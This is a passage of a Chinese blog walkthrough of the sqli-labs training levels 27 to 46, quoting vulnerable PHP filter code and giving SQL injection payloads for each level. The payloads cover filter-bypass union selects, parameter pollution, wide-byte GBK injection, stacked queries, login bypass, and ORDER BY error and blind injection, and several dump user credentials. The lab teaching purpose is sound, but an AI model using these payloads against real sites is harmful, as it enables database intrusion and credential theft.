preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out --.</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);            <span class="comment">//Strip out #.</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces.</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces.</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces.</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out union</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out select</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out UNION</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out SELECT</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out Union</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out Select</span></span><br><span class="line">    <span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>闭合不一样而已<br>payload: </p>
<blockquote>
<p>0”%A0or(1)=(1)%26%26%a0”1</p>
<p> <a target="_blank" rel="noopener" href="http://127.0.0.1/Less27/?id=0&quot;%EF%BF%BDUnIoN%EF%BF%BDSeLeCt(1),group_concat(table_name),3%EF%BF%BDfrom%EF%BF%BDinformation_schema.tables%EF%BF%BDwhere%EF%BF%BDtable_schema=&#39;security&#39;%26%26%a0&quot;1">http://127.0.0.1/Less27/?id=0&quot;%A0UnIoN%A0SeLeCt(1),group_concat(table_name),3%A0from%A0information_schema.tables%A0where%A0table_schema=&#39;security&#39;%26%26%a0&quot;1</a><br> <a target="_blank" rel="noopener" href="http://127.0.0.1/Less-27/?id=0&quot;%EF%BF%BDUnIoN%EF%BF%BDSeLeCt(1),group_concat(username),group_concat(password)%EF%BF%BDfrom%EF%BF%BDsecurity.users%EF%BF%BDwhere%EF%BF%BD1&&%EF%BF%BD&quot;1">http://127.0.0.1/Less-27/?id=0&quot;%A0UnIoN%A0SeLeCt(1),group_concat(username),group_concat(password)%A0from%A0security%2Eusers%A0where%A01%26%26%a0&quot;1</a></p>
</blockquote>
<h2 id="第二十八关："><a href="#第二十八关：" class="headerlink" title="第二十八关："></a>第二十八关：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);                <span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);                <span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);                    <span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);                <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);                    //Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);                <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>过滤union select这一个组合，也要过滤空格，所以采用union union select select方法绕过，空格照样用%0a替换</p>
<p> payload:</p>
<blockquote>
<p>0’)%A0UnIoN%A0SeLeCt(1),version(),database()%26%26%a0(‘1</p>
</blockquote>
<h2 id="28a"><a href="#28a" class="headerlink" title="28a:"></a>28a:</h2><p>简单不多说 </p>
<h2 id="第二十九关"><a href="#第二十九关" class="headerlink" title="第二十九关:"></a>第二十九关:</h2><p>加了一个很弱的”waf..”</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $qs = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">    $hint=$qs;</span><br><span class="line">    $id1=java_implimentation($qs);</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="comment">//echo $id1;</span></span><br><span class="line">    whitelist($id1);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">    $fp=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    fwrite($fp,<span class="string">&#x27;ID:&#x27;</span>.$id.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    fclose($fp);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">    $sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//WAF implimentation with a whitelist approach..... only allows input to be Numeric.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span>(<span class="params">$input</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $match = preg_match(<span class="string">&quot;/^\d+$/&quot;</span>, $input);</span><br><span class="line">    <span class="keyword">if</span>($match)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//echo &quot;you are good&quot;;</span></span><br><span class="line">        <span class="comment">//return $match;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;    </span><br><span class="line">        header(<span class="string">&#x27;Location: hacked.php&#x27;</span>);</span><br><span class="line">        <span class="comment">//echo &quot;you are bad&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params">$query_string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $q_s = $query_string;</span><br><span class="line">    $qs_array= explode(<span class="string">&quot;&amp;&quot;</span>,$q_s);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>($qs_array <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $val=substr($value,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>($val==<span class="string">&quot;id&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $id_value=substr($value,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">            <span class="keyword">return</span> $id_value;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>注入方法就是参数污染 </p>
<p> 例子  显示的是id=2的内容 但是waf检测的是前面id=1的内容  好理解吧？<br> <img src="https://img-blog.csdnimg.cn/20201027155728802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>payload:</p>
<blockquote>
<p>  <a target="_blank" rel="noopener" href="http://sqli-qing.cn/sqli/Less-29/?id=&#39;">http://sqli-qing.cn/sqli/Less-29/?id=&#39;</a> union select 1,version(),database() –+</p>
</blockquote>
<pre><code>http://sqli-qing.cn/sqli/Less-29/?id=&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+

http://sqli-qing.cn/sqli/Less-29/?id=&#39; union select 1,group_concat(username),group_concat(password) from security.users where 1 --+</code></pre>
<h2 id="第三十关："><a href="#第三十关：" class="headerlink" title="第三十关："></a>第三十关：</h2><p> 同上</p>
<h2 id="第三十一关"><a href="#第三十一关" class="headerlink" title="第三十一关:"></a>第三十一关:</h2><p>同上</p>
<h2 id="第三十二关："><a href="#第三十二关：" class="headerlink" title="第三十二关："></a>第三十二关：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string = preg_replace(<span class="string">&#x27;/&#x27;</span>. preg_quote(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, $string);          <span class="comment">//escape any backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, $string);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, $string);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">mysql_query(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strToHex</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$hex=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($string); $i++)</span><br><span class="line">&#123;</span><br><span class="line">$hex .= dechex(ord($string[$i]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $hex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hint: The Query String you input is escaped as : &quot;</span>.$id .<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;The Query String you input in Hex becomes : &quot;</span>.strToHex($id). <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>简单说check_addslashes函数把\ 单引号 双引号都进行过滤转义</p>
<p>明显的编码gbk  宽字节注入 不用多说</p>
<p>payload:</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-32/?id=-1%EF%BF%BD%27">http://127.0.0.1/Less-32/?id=-1%df%27</a> UNion seleCt 1,2,DATABASE()–+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20201027160108297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2 id="第33-34关："><a href="#第33-34关：" class="headerlink" title="第33-34关："></a>第33-34关：</h2><p> 同上</p>
<h2 id="第三十五关："><a href="#第三十五关：" class="headerlink" title="第三十五关："></a>第三十五关：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=check_addslashes($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="comment">//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line">mysql_query(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>id没有被单引号括起来所以addslashes起不到作用</p>
<p>正常各种payload即可:</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1i/Less-35/?id=-1x">http://127.0.0.1i/Less-35/?id=-1x</a> and extractvalue(1,concat(0x7e,(select database()),0x7e))–+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20201027160947348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2 id="第三十六关："><a href="#第三十六关：" class="headerlink" title="第三十六关："></a>第三十六关：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= mysql_real_escape_string($string);    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=check_quotes($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="comment">//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;</span></span><br></pre></td></tr></table></figure>
<p>mysql_real_escape_string转义  还是一样不多说</p>
<h2 id="第三十七关"><a href="#第三十七关" class="headerlink" title="第三十七关:"></a>第三十七关:</h2><p>post登录的而已</p>
<blockquote>
<p>uname=admin%df%27 or 1=2 union select 1,database()#</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20201027161239116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2 id="第三十八关"><a href="#第三十八关" class="headerlink" title="第三十八关:"></a>第三十八关:</h2><p>堆叠注入 来看看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query($con1, $sql))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* store first result set */</span></span><br><span class="line">    <span class="keyword">if</span> ($result = mysqli_store_result($con1))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>($row = mysqli_fetch_row($result))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;</span>;    </span><br><span class="line">            printf(<span class="string">&quot;Your Username is : %s&quot;</span>, $row[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            printf(<span class="string">&quot;Your Password is : %s&quot;</span>, $row[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//            mysqli_free_result($result);</span></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">/* print divider */</span></span><br><span class="line">    <span class="keyword">if</span> (mysqli_more_results($con1))</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="comment">//printf(&quot;-----------------\n&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">//while (mysqli_next_result($con1));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">    print_r(mysqli_error($con1));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/* close connection */</span></span><br><span class="line">mysqli_close($con1);</span><br></pre></td></tr></table></figure>
<p>mysqli_multi_query() 函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。（有这个才能进行堆叠）<br>分号我们可以加入注入的新的语句</p>
<p>payload:</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://sqli-qing.cn/sqli/Less-38/?id=2%EF%BF%BD&#39;">http://sqli-qing.cn/sqli/Less-38/?id=2%FE&#39;</a> or 1=1 %23</p>
</blockquote>
<pre><code>http://sqli-qing.cn/sqli/Less-38/?id=0%FE&#39; union select 1,version(),database() %23

http://sqli-qing.cn/sqli/Less-38/?id=0%FE&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23

http://sqli-qing.cn/sqli/Less-38/?id=0%FE&#39; union select 1,group_concat(username),group_concat(password) from security.users where 1 %23</code></pre>
<h2 id="39-43"><a href="#39-43" class="headerlink" title="39-43:"></a>39-43:</h2><p>参考38即可。<br>42关还是堆叠</p>
<blockquote>
<p>qing’;creat table me like users</p>
</blockquote>
<p>43关闭合为’) </p>
<h2 id="第44关"><a href="#第44关" class="headerlink" title="第44关:"></a>第44关:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$username = mysqli_real_escape_string($con1,$_POST[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">$password = $_POST[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (@mysqli_multi_query($con1, $sql))&#123;</span><br><span class="line">    <span class="keyword">if</span>($result = @mysqli_store_result($con1))&#123;</span><br><span class="line">        <span class="keyword">if</span>($row = @mysqli_fetch_row($result))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($row[<span class="number">1</span>])&#123;</span><br><span class="line">                 <span class="keyword">return</span> $row[<span class="number">1</span>];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<blockquote>
<p>login_user=admin&amp;login_password=1’ or ‘1’=’1&amp;mysubmit=login</p>
</blockquote>
<h2 id="第45关"><a href="#第45关" class="headerlink" title="第45关:"></a>第45关:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$username = mysqli_real_escape_string($con1, $_POST[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">$password = $_POST[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$username</span>&#x27;) and password=(&#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (@mysqli_multi_query($con1, $sql))&#123;</span><br><span class="line">    <span class="keyword">if</span>($result = @mysqli_store_result($con1))&#123;</span><br><span class="line">        <span class="keyword">if</span>($row = @mysqli_fetch_row($result))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($row[<span class="number">1</span>])&#123;</span><br><span class="line">                 <span class="keyword">return</span> $row[<span class="number">1</span>];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="第46关"><a href="#第46关" class="headerlink" title="第46关:"></a>第46关:</h2><p>到了order by注入 来看看哈</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[<span class="string">&#x27;sort&#x27;</span>];    </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($id))</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">    $fp=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    fwrite($fp,<span class="string">&#x27;SORT:&#x27;</span>.$id.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    fclose($fp);</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br></pre></td></tr></table></figure>


<p><img src="https://img-blog.csdnimg.cn/20201027162705744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>通过asc 和desc查看返回数据是否相同来简单判断是否存在order  by注入</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-46/?sort=1+asc">http://127.0.0.1/Less-46/?sort=1+asc</a><br><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-46/?sort=1+desc">http://127.0.0.1/Less-46/?sort=1+desc</a></p>
</blockquote>
<p> 说下order by可以哪些方法注入<br> 首先报错注入</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://sqli-qing.cn/sqli/Less-46/?sort=1">http://sqli-qing.cn/sqli/Less-46/?sort=1</a> and(updatexml(1,concat(0x7e,(select database())),0));</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20201027163010967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">还可以盲注  可以用到异或注入  这里布尔盲注</p>
<blockquote>
<p>id ^(select(select version()) regexp ‘^5’)<br><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-46/?sort=1">http://127.0.0.1/Less-46/?sort=1</a> ^(select(select version()) regexp ‘^5’)</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20201027163102514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>稍微提一下:</p>
<p>regexp正则匹配的时候，如果匹配到数据返回1(00000001)的时候，此时的1会和id中的数据的二进制进行异或，按照异或的结果进行升序排列，所以显示的排列会发生变化；反之当进行正则匹配的时候，未匹配到数据返回0(00000000)，此时数字和0异或的结果还是本身，所以显示的排列不会发生改变。<br>时间盲注也可以</p>
<blockquote>
